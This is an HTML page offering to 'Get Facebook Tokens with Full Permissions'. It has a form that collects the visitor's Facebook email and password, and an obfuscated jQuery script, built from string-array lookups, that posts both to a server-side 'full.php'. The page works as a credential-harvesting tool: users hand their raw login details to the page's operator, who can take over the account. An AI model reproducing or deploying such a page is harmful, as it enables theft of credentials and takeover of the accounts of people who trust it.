<html encoding="utf-8">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script src="//code.jquery.com/jquery.min.js"></script>
<title>Get Facebook Tokens | Full Script | HTC,IOS,IPHONE,ANDRIOD |</title> 
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
         <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
</head>
<body id="dashboard" class="background-dark template-product" ><br>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-90935031-1', 'auto');
  ga('send', 'pageview');

</script>
<div class="col-sm-3 blog-main"></div>
          <div class="col-sm-6 blog-main">
               <div class="panel panel-default">
                    <div class="panel-heading">
                         <h3 class="panel-title">Get Facebook Tokens with Full Permissions | Shared By<a href="http://facebook.com/muhammadashir4" target="_blank"> @ItxAxhu</a></h3>
                    </div>
                    <div class="panel-body">
						<div class="form-group">
						
						</div>
                         <div class="form-group">
                              <label for="email">Enter Your Facebook Email</label>
                              <input id="email" placeholder="Email here..." class="form-control"/>
                         </div>
                         <div class="form-group">
							  <label for="password">Enter Your Facebook Password</label>
                              <input id="password" type="password" placeholder="Password here..." class="form-control"/>
                         </div>
                         <div class="form-group">
                              <label for="app_id">Select Token Type</label>
                              <select id="app_id" class="form-control">
								<option value="6628568379">FACEBOOK FOR IPHONE</option>
								<option value="350685531728">FACEBOOK FOR ANDROID</option>
								<option value="165907476854626">PAGES MANAGER FOR IOS</option>
								<option value="41158896424">HTC Sense</option> 
                              </select>
                         </div>
                         <div class="form-group text-center">
                              <button id="submit" class="btn btn-sm btn-primary">Get Token</button>
                         </div>
                         <div class="form-group text-center" id="load_result" style="display:none">
                              <label for="result"><center>Access Token Below :</center></label>
                              <textarea id="result" onclick="this.focus();this.select()" class="form-control" rows="4"></textarea>
                         </div>
                    </div>
               </div>
               <div class="panel panel-default">
                    <div class="panel-heading">
                   <center>      <h3 class="panel-title">Made with  and ❤ and ☕ | By <a href="http://facebook.com/muhammadashir4" target="_blank"> Ashir Ali</a></h3> <center>
                    </div>
						
                   
               </div>
     </div>
</body>
</html>


<script>
var array = ["click", "#submit", "disabled", "attr", "Getting Access Token", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Get Token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "full.php", "post", "ajax", "on"];
$(document)[array[20]](array[0], array[1], function () {
        $(array[1])[array[3]](array[2], array[2]), $(array[1])[array[5]](array[4]);
        var email = $(array[7])[array[6]](),
            password = $(array[8])[array[6]](),
            app_id = $(array[9])[array[6]]();
        $[array[19]]({
            url: array[17],
            type: array[18],
            data: {
                email: email,
                password: password,
                app_id: app_id
            },
            success: function (email) {
                $(array[1])[array[10]](array[2]), $(array[1])[array[5]](array[11]), $(array[13])[array[12]](), $(array[15])[array[6]](email)
            }
        })[array[16]](function () {
            $(array[1])[array[10]](array[2]), $(array[1])[array[5]](array[11]), $(array[13])[array[12]](), $(array[15])[array[6]](array[14])
        })
    })
</script>